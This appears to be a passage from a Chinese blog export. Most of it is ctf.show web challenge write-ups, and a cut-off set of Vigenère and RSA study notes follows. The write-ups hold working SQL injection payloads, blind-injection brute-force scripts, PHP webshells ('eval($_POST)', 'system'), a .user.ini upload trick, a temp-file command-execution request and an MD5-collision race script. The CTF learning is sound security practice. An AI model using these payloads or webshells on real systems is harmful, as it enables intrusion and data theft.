flag),3;#`可以成功哈哈哈哈哈哈哈哈哈哈哈哈哈哈开心开心\n> 得到flag\n> flag{e2256c7f-d21a-4574-a94f-e045f506a44c}\n> flag为动态生成，flag值和笔者值不同\n> WP BY ynm3000\n\n#### web3\n![alt text](/img/ctfshow-web合集wp_image-23.png)\n![alt text](/img/ctfshow-web合集wp_image-24.png)\n\n#### web4\n![alt text](/img/ctfshow-web合集wp_image-28.png)\n- 这台服务器是linux系统，他能用url参数访问，那我们来看一下的日志文件`/var/log/nginx/access.log`，发现了它是有回显的，回显的参数是我们请求包的User-Agent\n\n![alt text](/img/ctfshow-web合集wp_image-29.png)\n- 上传木马，内容为连接密码\n- 中国蚁剑，靶场地址/?url=/var/log/nginx/access.log，密码+忽略https证书/靶场地址https改为http\n\n![alt text](/img/ctfshow-web合集wp_image-30.png)\n#### web5\n- 代码审计题，它将网站的源码给了出来\n```html\n<?php\nerror_reporting(0);\n    \n?>\n<html lang=\"zh-CN\">\n\n<head>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0\" />\n    <title>ctf.show_web5</title>\n</head>\n<body>\n    <center>\n    <h2>ctf.show_web5</h2>\n    <hr>\n    <h3>\n    </center>\n    <?php\n        $flag=\"\";\n        $v1=$_GET['v1'];\n        $v2=$_GET['v2'];\n        if(isset($v1) && isset($v2)){\n            if(!ctype_alpha($v1)){\n                die(\"v1 error\");\n            }\n            if(!is_numeric($v2)){\n                die(\"v2 error\");\n            }\n            if(md5($v1)==md5($v2)){\n                echo $flag;\n            }\n        }else{\n        \n            echo \"where is flag?\";\n        }\n    ?>\n\n</body>\n</html>\n```\n![alt text](/img/ctfshow-web合集wp_image-26.png)\n- [【转载】md5相关](/2025/11/25/【转载】md5相关)\n\n![alt text](/img/ctfshow-web合集wp_image-27.png)\n\n#### web6\n- 可以代替空格的字符：\n```\n+\n%0A\n%0B\n%0D\n%A0\n/**/\n```\n`'/**/or/**/1=1/**/order/**/by/**/1;#`\n- 4没有\n`'/**/or/**/1=1/**/union/**/select/**/1,2,3;#`\n- 2回显\n`'/**/or/**/1=1/**/union/**/select/**/1,database(),3;#`\n- web2\n`'/**/or/**/1=1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database();/**/#`\n- 还是flag,user\n`'/**/or/**/1=1/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='flag';/**/#`\n- 还是flag数据库里面只有一个flag\n`'/**/or/**/1=1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3;#`\n- 结束\n#### web7\n![alt text](/img/ctfshow-web合集wp_image-31.png)\n- 数字型\n`/**/or/**/1=1/**/order/**/by/**/1;#`\n\n![alt text](/img/ctfshow-web合集wp_image-32.png)\n- 4没有\n\n![alt text](/img/ctfshow-web合集wp_image-33.png)\n- 2回显\n`/**/or/**/1=1/**/union/**/select/**/1,database(),3/**/;#`\n- 表名web7\n\n![alt text](/img/ctfshow-web合集wp_image-34.png)\n- flag,page,user\n\n![alt text](/img/ctfshow-web合集wp_image-35.png)\n- 过滤了单引号，改成双引号\n`/**/or/**/1=1/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=\"flag\";/**/#`\n- 只有一列flag\n\n![alt text](/img/ctfshow-web合集wp_image-36.png)\n`/**/or/**/1=1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3;#`\n\n#### web8\n- 成功web自动化脱库脚本（已忽略证书错误）（存在SQL注入, 注入点为数值型注入）：【**疑问1**：为什么这个脚本web14不能用】\n```python\nimport requests\nimport urllib3\n\n# 禁用SSL警告\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n# 创建session对象，统一设置verify=False\nsession = requests.Session()\nsession.verify = False\n\nurl = 'https://85769112-f085-4b8e-b003-4fc771a59964.challenge.ctf.show/index.php?id=-1/**/or/**/'\nname = ''\n\n# 获取用户输入的爆破长度\nuser_input = input(\"请输入要爆破的字符数量（直接回车使用默认值45）: \")\n\n# 处理用户输入\nif user_input.strip() == \"\":\n    length = 45\n    print(f\"使用默认长度: {length}\")\nelse:\n    try:\n        length = int(user_input)\n        print(f\"使用自定义长度: {length}\")\n    except ValueError:\n        print(\"输入无效，使用默认长度45\")\n        length = 45\n\n# 循环指定次数\nfor i in range(1, length + 1):\n    # 获取当前使用的数据库\n    # payload = 'ascii(substr(database()from/**/%d/**/for/**/1))=%d'\n    # 获取当前数据库的所有表\n    # payload = 'ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d'\n    # 获取flag表的字段\n    # payload = 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d'\n    # 获取flag表的数据\n    payload = 'ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d'\n    count = 0\n    print('正在获取第 %d 个字符' % i)\n    \n    # 截取SQL查询结果的每个字符, 并判断字符内容\n    found = False\n    for j in range(31, 128):\n        # 使用session对象发送请求\n        result = session.get(url + payload % (i, j))\n\n        if 'If' in result.text:\n            name += chr(j)\n            print('数据库名/表名/字段名/数据: %s' % name)\n            found = True\n            break\n\n        # 如果某个字符不存在,则停止程序\n        count += 1\n    \n    # 如果在这个位置没有找到任何字符，提前结束\n    if not found:\n        print(f\"在第 {i} 个位置没有找到有效字符，提前结束爆破\")\n        break\n\nprint(\"\\n爆破完成!\")\nif name:\n    print(f\"最终结果: {name}\")\nelse:\n    print(\"没有获取到任何数据\")\n```\n\n- 未尝试脚本：\n```python\nimport requests\n\nurl = 'http://53aab0c2-b451-4910-a1e0-f15fd9e64b2a.challenge.ctf.show:8080/index.php?id=-1/**/or/**/'\nname = ''\n\n# 循环45次( 循环次数按照返回的字符串长度自定义)\nfor i in range(1, 45):\n    # 获取当前使用的数据库\n    # payload = 'ascii(substr(database()from/**/%d/**/for/**/1))=%d'\n    # 获取当前数据库的所有表\n    # payload = 'ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d'\n    # 获取flag表的字段\n    # payload = 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d'\n    # 获取flag表的数据\n    payload = 'ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d'\n    count = 0\n    print('正在获取第 %d 个字符' % i)\n    # 截取SQL查询结果的每个字符, 并判断字符内容\n    for j in range(31, 128):\n        result = requests.get(url + payload % (i, j))\n\n        if 'If' in result.text:\n            name += chr(j)\n            print('数据库名/表名/字段名/数据: %s' % name)\n            break\n\n        # 如果某个字符不存在,则停止程序\n        count += 1\n        if count >= (128 - 31):\n            exit()\n\n```\n\n#### web9\n![alt text](/img/ctfshow-web合集wp_image-37.png)\n![alt text](/img/ctfshow-web合集wp_image-38.png)\n```php\n\n\n\n<?php\n        $flag=\"\";\n\t\t$password=$_POST['password'];\n\t\tif(strlen($password)>10){\n\t\t\tdie(\"password error\");\n\t\t}\n\t\t$sql=\"select * from user where username ='admin' and password ='\".md5($password,true).\"'\";\n\t\t$result=mysqli_query($con,$sql);\n\t\t\tif(mysqli_num_rows($result)>0){\n\t\t\t\t\twhile($row=mysqli_fetch_assoc($result)){\n\t\t\t\t\t\t echo \"登陆成功<br>\";\n\t\t\t\t\t\t echo $flag;\n\t\t\t\t\t }\n\t\t\t}\n    ?>\n\n```\n\n- 字符串\"ffifdyop\"的MD5哈希在原始二进制形式中是 'or'6<乱码>，具体是：md5(\"ffifdyop\", true) 返回的字符串包含 'or'6] 等等，但重要的是它包含 'or' 后跟一个非零数字，在SQL中，非零数字被视为真。\n- 在SQL查询中，如果密码字段等于这个字符串，那么查询会变成：\n```SQL\nwhere password = ''or'6...'\n```\n- 由于在SQL中，'or'6' 会被解释为：密码等于空字符串，或者 '6' 为真（因为 '6' 是一个非空字符串，在布尔上下文中为真）。所以整个条件会成为真。\n- 这相当于： (password = '') or ('6...' ) ，而 '6...' 是一个非空字符串，所以为真。因此，只要用户名是admin，并且这个条件为真，就能登录。\n- 且密码 \"ffifdyop\" 的长度是8，小于10，所以符合长度要求。\n![alt text](/img/ctfshow-web合集wp_image-39.png)\n#### web10\n- 点击取消下载了源码。。。\n```php\n<?php\n\t\t$flag=\"\";\n        function replaceSpecialChar($strParam){\n             $regex = \"/(select|from|where|join|sleep|and|\\s|union|,)/i\";\n             return preg_replace($regex,\"\",$strParam);\n        }\n        if (!$con)\n        {\n            die('Could not connect: ' . mysqli_error());\n        }\n\t\tif(strlen($username)!=strlen(replaceSpecialChar($username))){\n\t\t\tdie(\"sql inject error\");\n\t\t}\n\t\tif(strlen($password)!=strlen(replaceSpecialChar($password))){\n\t\t\tdie(\"sql inject error\");\n\t\t}\n\t\t$sql=\"select * from user where username = '$username'\";\n\t\t$result=mysqli_query($con,$sql);\n\t\t\tif(mysqli_num_rows($result)>0){\n\t\t\t\t\twhile($row=mysqli_fetch_assoc($result)){\n\t\t\t\t\t\tif($password==$row['password']){\n\t\t\t\t\t\t\techo \"登陆成功<br>\";\n\t\t\t\t\t\t\techo $flag;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t }\n\t\t\t}\n    ?>\n\n```\n- username是注入点\n- 过滤规则：/(select|from|where|join|sleep|and|\\s|union|,)/i\n  - 过滤了空格（通过\\s）\n- payload：\n  - `'or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#`\n- 原SQL语句：select * from user where username = '$username'\n- 将payload代入：select * from user where username = ''or//1=1//group//by//password//with//rollup#'\n- 这里使用了注释符#将后面的单引号注释掉，所以SQL语句变为：`select * from user where username = '' or 1=1 group by password with rollup`\n- 这个语句的含义是：\n  - 条件：username = '' 或者 1=1（永远为真）\n  - 然后按照password字段分组，并使用with rollup产生小计和总计行。\n- 在PHP中，NULL和空字符串在松散比较（==）下是相等的\n- 使用了WITH ROLLUP，会产生一些password为NULL的行。如果用户输入的密码为空（或者为某个特定值，比如0，但这里注意是松散比较），那么当比较到password为NULL的行时，可能会因为PHP的松散比较而成立\n#### web11\n```php\n<?php\n        function replaceSpecialChar($strParam){\n             $regex = \"/(select|from|where|join|sleep|and|\\s|union|,)/i\";\n             return preg_replace($regex,\"\",$strParam);\n        }\n        if(strlen($password)!=strlen(replaceSpecialChar($password))){\n            die(\"sql inject error\");\n        }\n        if($password==$_SESSION['password']){\n            echo $flag;\n        }else{\n            echo \"error\";\n        }\n    ?>\n\n```\n![alt text](/img/ctfshow-web合集wp_image-40.png)\n- 将Cookie给它清掉，这样就没有Session了，理论上我们就可以绕过了\n- burpsuite抓包\n- 失败\n- 学习[cookie和session的详解与区别](https://www.cnblogs.com/l199616j/p/11195667.html)\n  - 会话（Session）跟踪是Web程序中常用的技术，用来跟踪用户的整个会话。常用的会话跟踪技术是Cookie与Session。Cookie通过在客户端记录信息确定用户身份，Session通过在服务器端记录信息确定用户身份。\n  - Session对象是在客户端第一次请求服务器的时候创建的。\n  - Session保存在服务器端。为了获得更高的存取速度，服务器一般把Session放在内存里。\n  - 两者最大的区别在于生存周期，一个是IE启动到IE关闭.(浏览器页面一关 ,session就消失了)，一个是预先设置的生存周期，或永久的保存于本地的文件。(cookie)\n\n![alt text](/img/ctfshow-web合集wp_image-41.png)\n\n#### web12\n> 感谢AW_SOLE师傅：[来源](https://www.cnblogs.com/awsole/p/14386069.html)\n> ![alt text](/img/ctfshow-web合集wp_image-42.png)\n\n```php\n?cmd=print_r(scandir(\".\"));//查看当前所有的目录文件 \n?cmd=print_r(glob(\"*.*\"));\n?cmd=show_source(\"903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php\"); \n```\n\n#### web13\n> ![alt text](/img/ctfshow-web合集wp_image-43.png)\n\n- 文件上传页面,下载一下备份文件进行一下代码审计upload.php.bak，在url中加入即可\n```php\n<?php \n\theader(\"content-type:text/html;charset=utf-8\");\n\t$filename = $_FILES['file']['name'];\n\t$temp_name = $_FILES['file']['tmp_name'];\n\t$size = $_FILES['file']['size'];\n\t$error = $_FILES['file']['error'];\n\t$arr = pathinfo($filename);\n\t$ext_suffix = $arr['extension'];\n\tif ($size > 24){\n\t\tdie(\"error file zise\");\n\t}\n\tif (strlen($filename)>9){\n\t\tdie(\"error file name\");\n\t}\n\tif(strlen($ext_suffix)>3){ # 后缀名的长度要大于3\n\t\tdie(\"error suffix\");\n\t}\n\tif(preg_match(\"/php/i\",$ext_suffix)){ # 后缀名要包含php\n\t\tdie(\"error suffix\");\n    }\n    if(preg_match(\"/php/i\"),$filename)){\n        die(\"error file name\");\n    }\n\tif (move_uploaded_file($temp_name, './'.$filename)){\n\t\techo \"文件上传成功！\";\n\t}else{\n\t\techo \"文件上传失败！\";\n\t}\n\n ?>\n\n```\n> - 学习[ctf.show_web13(文件上传之.user.ini)](https://www.cnblogs.com/culin/p/14434279.html)\n> - .user.ini#\n>   - 自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。\n>   - .htaccess是伪静态环境配置文件，用于lamp。 .user.ini是lnmp文件，里面放的是你网站的文件夹路径地址。目的是防止跨目录访问和文件跨目录读取. 配置 放在根目录 .user.ini\n> - 两个PHP方法：\n>   - auto_prepend_file:在页面顶部加载文件\n>   - auto_append_file:在页面底部加载文件\n> `auto_append_file=a.txt`\n> - 上传点.user.ini，这时候任何一个PHP文件都可以使用菜刀连接，但是连接上去后啥也没有。\n> - 使用`print_r(glob(\"*\"));`可以查看当前目录下所有文件\n> - 然后使用`highlight_file`函数，用字符串形式返回php文件的内容\n> `w=highlight_file(\"903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php\");`\n> - 夺取flag.\n\n![alt text](/img/ctfshow-web合集wp_image-44.png)\n- 上传a.txt：<?php eval($_GET[1]);?>\n\n![alt text](/img/ctfshow-web合集wp_image-45.png)\n![alt text](/img/ctfshow-web合集wp_image-46.png)\n\n#### web14\n```php\n<?php\ninclude(\"secret.php\");\n\nif(isset($_GET['c'])){\n    $c = intval($_GET['c']);\n    sleep($c);\n    switch ($c) {\n        case 1:\n            echo '$url';\n            break;\n        case 2:\n            echo '@A@';\n            break;\n        case 555555:\n            echo $url;\n        case 44444:\n            echo \"@A@\";\n            break;\n        case 3333:\n            echo $url;\n            break;\n        case 222:\n            echo '@A@';\n            break;\n        case 222:\n            echo '@A@';\n            break;\n        case 3333:\n            echo $url;\n            break;\n        case 44444:\n            echo '@A@';\n        case 555555:\n            echo $url;\n            break;\n        case 3:\n            echo '@A@';\n        case 6000000:\n            echo \"$url\";\n        case 1:\n            echo '@A@';\n            break;\n    }\n}\n\nhighlight_file(__FILE__);\n```\n![alt text](/img/ctfshow-web合集wp_image-47.png)\n- 访问一下here_1s_your_f1ag.php发现这是一个查询框并且带有弹窗回显，那么很明显说明这里是一个sql注入漏洞\n- 2-1\n- 有回显，数字型\n- order by 1无弹窗→就说明无回显！！！\n- 有过滤\n\n![alt text](/img/ctfshow-web合集wp_image-48.png)\n`/**/or/**/1=1/**/order/**/by/**/1;#`\n- 列数1\n`/**/or/**/1=1/**/union/**/select/**/222;#`\n- 不回显222\n要把query改为不存在\n`?query=-1/**/union/**/select/**/database();#`\n- 回显web\n- 死活出不来web数据库下的表名\n- 看下源代码\n```php\n<!--\n\tif(preg_match('/information_schema\\.tables|information_schema\\.columns|linestring| |polygon/is', $_GET['query'])){\n\t\tdie('@A@');\n\t}\n-->\n```\n- 原来是过滤掉了\n\n![alt text](/img/ctfshow-web合集wp_image-49.png)\n- 对于那些过滤了的关键字我们使用反引号进行绕过\n  - Shell 在执行一条命令时，如果遇到反引号包裹的字符串，它会先执行反引号内的内容作为系统命令，然后用该命令的输出结果替换掉整个反引号部分\n\n![alt text](/img/ctfshow-web合集wp_image-50.png)\n```\n?query=-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.\\`tables`/**/where/**/table_schema=database();/**/#\n```\n- 表名为content\n```\n?query=-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_schema=database()/**/and/**/table_name='content';/**/#\n```\n![alt text](/img/ctfshow-web合集wp_image-51.png)\n- id,username,password\n`?query=-1/**/union/**/select/**/group_concat(id,username,password)from/**/content;#`\n\n![alt text](/img/ctfshow-web合集wp_image-52.png)\n\n`?query=-1/**/union/**/select/**/load_file('/var/www/html/secret.php')`\n- 看源代码，出现变化\n![alt text](/img/ctfshow-web合集wp_image-53.png)\n`?query=-1/**/union/**/select/**/load_file('/real_flag_is_here')`\n![alt text](/img/ctfshow-web合集wp_image-54.png)\n\n#### 红包题第二弹\n![alt text](/img/ctfshow-web合集wp_image-55.png)\n![alt text](/img/ctfshow-web合集wp_image-56.png)\n![alt text](/img/ctfshow-web合集wp_image-57.png)\n- 不会了，学习一下\n\n> - 来源：<https://www.cnblogs.com/alm0st/p/16421013.html>\n> - 感谢alm0st师傅\n> - 在php中，使用`Content-Type: multipart/form-data;`上传文件时，会将它保存在临时文件中，在php的配置中`upload_tmp_dir`参数为保存临时文件的路经，linux下面默认为`/tmp`。也就是说只要php接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何,在执行结束后这个文件会被删除。并且php每次创建的临时文件名都有固定的格式，为`phpXXXX.tmp`（Windows中）、`php**.tmp`（Linux中）。\n> - 暂时放下，后面步骤好复杂的方法\n\n> - 来源：<https://blog.csdn.net/Ethan552525/article/details/118459568>\n> - 感谢Ethan552525师傅\n> - 构造cmd：?cmd=?><?=`.+/??p/p?p??????`，由eval（$cmd）来运行临时文件\n>   - 在php中，<? ?>称为短标签，<?php ?>称为长标签。修改PHP.ini文件配置 short_open_tag = On 才可使用短标签\n>   - php5.4.0以后， <?= 总是可代替 <? echo\n>   - 在php中反引号的作用是命令替换，将其中的字符串当成shell命令执行，返回命令的执行结果。反引号包括的字符串必须是能执行的shell命令，否则会出错\n在php中反引号的作用是命令替换，将其中的字符串当成shell命令执行，返回命令的执行结果。反引号包括的字符串必须是能执行的shell命令，否则会出错\n>   - 点命令等于source命令，用来执行文件。\n>       - `source /home/user/bash`等同于`. /home/user/bash`\n>   - URL编码中空格为%20，+表示为%2B。然而url中+也可以表示空格，要表示+号必须得用%2B\n>   - php上传文件后会将文件存储在临时文件夹，然后用move_uploaded_file() 函数将上传的文件移动到新位置。临时文件夹可通过php.ini的upload_tmp_dir指定，默认是/tmp目录\n>       - 临时文件命名规则：默认为 php+4或者6位随机数字和大小写字母，在windows下有tmp后缀，linux没有。比如windows下：phpXXXXXX.tmp  linux下：phpXXXXXX。\n>   - ？通配符代表一个任意字符\n> - 上传文件\n>   - 用burpsuite发送POST请求，上传文件。（注意：**Content-Length下必须空一行**）\n> ![alt text](/img/ctfshow-web合集wp_image-58.png)\n>   - 以上请求头修改了3个地方：\n> \n> ```html\n> POST /?cmd=?><?=`.+/??p/p?p??????`; HTTP/1.1\n> \n> Content-Type: multipart/form-data; \n> boundary=---------------------------10242300956292313528205888\n> \n> -----------------------------10242300956292313528205888\n> Content-Disposition: form-data; name=\"fileUpload\"; filename=\"1.txt\"\n> Content-Type: text/plain\n> \n> #! /bin/sh\n> cat /flag.txt\n> -----------------------------10242300956292313528205888--\n> ```\n> \n> 1. Content-Type\n> - Content-Type有两个值：\n>   - application/x-www-form-urlencoded(默认值) ：上传键值对\n>   - multipart/form-data：上传文件\n> 2. boundary边界分隔符\n> - 文件开始标记：-----------------------------10242300956292313528205888\n> - 文件结束标记：-----------------------------10242300956292313528205888--\n> - 其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。\n> 3. 文件内容\n> - #! /bin/sh 指定命令解释器，#!是一个特殊的表示符，其后，跟着解释此脚本的shell路径。bash只是shell的一种，还有很多其它shell，如：sh,csh,ksh,tcsh。首先用命令`ls / `来查看服务器根目录有哪些文件，发现有flag.txt，然后再用`cat /flag.txt`即可。\n> \n> **原文版权声明**：本文为CSDN博主「Ethan552525」的原创文章，遵循CC 4.0 BY-SA版权协议。\n\n![alt text](/img/ctfshow-web合集wp_image-60.png)\n![alt text](/img/ctfshow-web合集wp_image-59.png)\n- 注意文件部分空行\n  - `#！ /bin/sh`后面的空行不能有空格！！！！\n\n![alt text](/img/ctfshow-web合集wp_image-62.png)\n\n- 还有种复刻失败方法<https://fishpi.cn/article/1637551394102?p=1&m=0>\n\n#### 红包题第六弹\n- 随便输入点东西\n- md5 error\n\n- dirmap\n\n![alt text](/img/ctfshow-web合集wp_image-63.png)\n- 下载下来了zip文件欸看看\n```php\nfunction receiveStreamFile($receiveFile){\n \n    $streamData = isset($GLOBALS['HTTP_RAW_POST_DATA'])? $GLOBALS['HTTP_RAW_POST_DATA'] : '';\n \n    if(empty($streamData)){\n        $streamData = file_get_contents('php://input');\n    }\n \n    if($streamData!=''){\n        $ret = file_put_contents($receiveFile, $streamData, true);\n    }else{\n        $ret = false;\n    }\n \n    return $ret;\n \n}\nif(md5(date(\"i\")) === $token){\n\t\n\t$receiveFile = 'flag.dat';\n\treceiveStreamFile($receiveFile);\n\tif(md5_file($receiveFile)===md5_file(\"key.dat\")){\n\t\tif(hash_file(\"sha512\",$receiveFile)!=hash_file(\"sha512\",\"key.dat\")){\n\t\t\t$ret['success']=\"1\";\n\t\t\t$ret['msg']=\"人脸识别成功!$flag\";\n\t\t\t$ret['error']=\"0\";\n\t\t\techo json_encode($ret);\n\t\t\treturn;\n\t\t}\n\n\t\t\t$ret['errormsg']=\"same file\";\n\t\t\techo json_encode($ret);\n\t\t\treturn;\n\t}\n\t\t\t$ret['errormsg']=\"md5 error\";\n\t\t\techo json_encode($ret);\n\t\t\treturn;\n} \n\n$ret['errormsg']=\"token error\";\necho json_encode($ret);\nreturn;\n\n```\n\n- 不懂，学习一下\n> 感谢渗透好难师傅：[来源](https://jishuzhan.net/article/1932660427053379585)\n> - 先进行if判断，也就是我们输入的token需要和md5(date(\"i\"))相同\n> - md5不用说，date(\"i\")就是获得当前的分钟\n> - 扩展一下，date(\"m\")就是获得当前的月\n>   - date(\"d\")是获得当前的日\n>   - date(\"h\")获得当前的小时\n>   - date(\"s\")获得当前的秒\n>   - 所以我们输入的token就是需要是当前的分钟进行md5加密\n> - 接着往下分析，看到了$receiveFile变量接收了一个字符串flag.dat，然后被传入了receiveStreamFile方法中\n> - receiveStreamFile方法中会先进行判断，判断$GLOBALS['HTTP_RAW_POST_DATA']是否为空\n> - 优先从GLOBALS\\['HTTP_RAW_POST_DATA'\\]​ 获取原始数据，如果为空，那么就利用php://input​流获取POST数据，然后将数据写入receiveFile指定的文件，也就是flag.dat\n> - 然后返回值，进行if判断，我们写入的文件和服务器存放发文件key.dat的md5值需要一样，但哈希值不需要一样，总所周知，可以利用工具制造一个md5一样的文件，但哈希都是独一无二的，所以就可以很轻松过了这个检测\n\n- key.dat直接访问下载后使用fastcoll碰撞md5相同文件\n\n![alt text](/img/ctfshow-web合集wp_image-64.png)\n```python\nimport requests\nimport datetime\nimport threading\nimport hashlib\n\nt = datetime.datetime.now().minute\t\t\t#获取当前分钟\ntoken = hashlib.md5(str(t).encode()).hexdigest()\t\t\t#将获取的分钟进行md5加密\nre = ''\t\t\t#设置全局变量，用于接收返回的页面源码\nurl = \"https://eb54f667-cb27-4ea4-ae69-ed5e6ae79d6d.challenge.ctf.show/\"\ndef szRequest(url, flag):\n    url = f\"{url}check.php?token={token}&php://input\"\n    global re\n    s = requests.post(url, data=flag, verify=False)\t\t#利用POST请求，请求数据就是传入的key和data      #关闭证书校验\n    re = s.text\n\nwith open('E:\\\\Downloads\\\\key.dat', 'rb') as f:\t\t\t\t#读取下载的key\n    key = f.read()\nwith open('E:\\\\Downloads\\\\key_msg1.dat', 'rb') as fi:\t\t\t#读取利用工具生成的文件，生成的文件1或文件2都可以\n    data = fi.read()\nwhile True:\n    threading.Thread(target=szRequest, args=(url, key)).start()\t\t\t#python中的多线程模块\n    threading.Thread(target=szRequest, args=(url, data)).start()\t\t#threading.Thread()创建线程对象，target=szRequest，指定当前线程要执行的函数，args=(url, data)是执行函数传入的参数，.start()是开始执行\n    if \"ctfshow\" in re:\t\t\t\n        print(re)\t\t\t#如果返回的页面源码中有ctfshow字符串，就打印并退出\n        break\n```\n#### 红包题第七弹\n- dirmap\n\n![alt text](/img/ctfshow-web合集wp_image-65.png)\n\n\n\n\n\n\n- 常用木马\n```php\n<?php system('ls')?>\n<?php @eval($_POST('777'));?>\n```\n\n## 参考\n- 感谢SlackMoon：<https://blog.csdn.net/m0_61155226/article/details/123328664>\n- 感谢呆羊7z：<https://www.cnblogs.com/DylanCtfer/p/19023026>","tags":["wp","ctf","pwn"],"categories":["wp"]},{"title":"bilibili速成crypto视频学习笔记","url":"/2025/10/18/bilibili速成crypto视频学习笔记/","content":"\n### 工具：\n- cyberchef魔法棒\n- 轩禹RSA\n \n### 密码：\n#### 维吉尼亚密码计算密钥-->维吉尼亚密钥只能由字母组成\n```python\ndef find_vigenere_key(plaintext, ciphertext):\n    \"\"\"\n    根据维吉尼亚密码的明文和密文推导密钥\n\n    参数:\n        plaintext (str): 明文，可以包含字母、数字和其他字符\n        ciphertext (str): 密文，可以包含字母、数字和其他字符\n\n    返回:\n        str: 推导得到的密钥，大小写与明文保持一致\n    \"\"\"\n    # 确保输入的明文和密文长度相同\n    if len(plaintext) != len(ciphertext):\n        raise ValueError(\"明文和密文的长度必须相同\")\n\n    key = []\n    # 遍历每个字符对，计算对应的密钥字符\n    for p, c in zip(plaintext, ciphertext):\n        # 检查是否都为字母或都为非字母\n        if p.isalpha() and c.isalpha():\n            # 都是字母，计算密钥\n            is_upper = p.isupper()  # 确定大小写，与明文保持一致\n\n            # 转换为0-25的数值 (A=0, B=1, ..., Z=25)\n            p_val = ord(p.upper()) - ord('A')\n            c_val = ord(c.upper()) - ord('A')\n\n            # 计算密钥值: 密钥 = (密文 - 明文) mod 26\n            k_val = (c_val - p_val) % 26\n\n            # 转换回字母，并保持原大小写\n            key_char = chr(k_val + ord('A'))\n            if not is_upper:\n                key_char = key_char.lower()\n\n            key.append(key_char)\n        elif not p.isalpha() and not c.isalpha():\n            # 都不是字母，密钥保持与明文一致\n            key.append(p)\n        else:\n            # 一个是字母，一个不是字母，不匹配\n            raise ValueError(f\"明文和密文在位置 {len(key)} 处不匹配（一个是字母，一个是非字母）\")\n\n    return ''.join(key)\n\n\ndef main():\n    print(\"维吉尼亚密码密钥推导工具\")\n    print(\"-------------------------\")\n\n    # 获取用户输入\n    plaintext = input(\"请输入明文: \")\n    ciphertext = input(\"请输入密文: \")\n\n    try:\n        # 推导密钥\n        key = find_vigenere_key(plaintext, ciphertext)\n        print(f\"\\n推导得到的密钥是: {key}\")\n\n        # 验证密钥是否正确\n        # 维吉尼亚加密函数用于验证\n        def vigenere_encrypt(text, key):\n            encrypted = []\n            key_len = len(key)\n            for i, char in enumerate(text):\n                k_char = key[i % key_len]\n\n                if char.isalpha() and k_char.isalpha():\n                    # 都是字母，进行加密\n                    is_upper = char.isupper()\n\n                    t_val = ord(char.upper()) - ord('A')\n                    k_val = ord(k_char.upper()) - ord('A')\n                    c_val = (t_val + k_val) % 26\n\n                    encrypted_char = chr(c_val + ord('A'))\n                    if not is_upper:\n                        encrypted_char = encrypted_char.lower()\n\n                    encrypted.append(encrypted_char)\n                elif not char.isalpha() and not k_char.isalpha():\n                    # 都不是字母，保持不变\n                    encrypted.append(char)\n                else:\n                    # 一个是字母，一个不是字母，无法加密\n                    raise ValueError(f\"明文和密钥在位置 {i} 处不匹配（一个是字母，一个是非字母）\")\n\n            return ''.join(encrypted)\n\n        # 使用推导出的密钥加密明文，检查是否与密文一致\n        verified_ciphertext = vigenere_encrypt(plaintext, key)\n        if verified_ciphertext == ciphertext:\n            print(\"验证成功: 使用该密钥加密明文得到的结果与输入的密文一致\")\n        else:\n            print(f\"验证失败: 使用该密钥加密得到 {verified_ciphertext}，与输入的密文不一致\")\n\n    except ValueError as e:\n        print(f\"错误: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\"\"\"\n维吉尼亚密码密钥推导工具\n-------------------------\n请输入明文: 0xGame\n请输入密文: 0lCcop\n\n推导得到的密钥是: 0oWccl\n验证成功: 使用该密钥加密明文得到的结果与输入的密文一致\n\n进程已结束，退出代码为 0\n\"\"\"\n```\n\n#### RSA\n##### RSA 算法原理\n- 基于**大整数分解难题（IFP）**，是目前最广泛使用的非对称加密算法。\n- 生成公私钥\n1. **选取大素数**：选择两个不同大素数 $p$ 和 $q$，计算 $N = p \\cdot q$。\n2. **欧拉函数**：计算 $\\varphi(N) = (p-1)(q-1)$。若 $p$ 为素数，则 $\\varphi(p) = p-1$。\n   $\\varphi(N)$ 表示小于 $N$ 且与 $N$ 互质的数的个数。\n3. **选择公钥指数**：选整数 $e$ 满足 $1 < e < \\varphi(N)$ 且 $\\gcd(e, \\varphi(N)) = 1$。\n4. **计算私钥指数**：求 $e$ 在模 $\\varphi(N)$ 下的乘法逆元 $d$，即 $e \\cdot d \\equiv 1 \\pmod{\\varphi(N)}$。\n   **乘法逆元**：若 $a \\cdot b \\equiv 1 \\pmod{m}$，则 $b$ 是 $a$ 在模 $m$ 下的逆元。\n5. 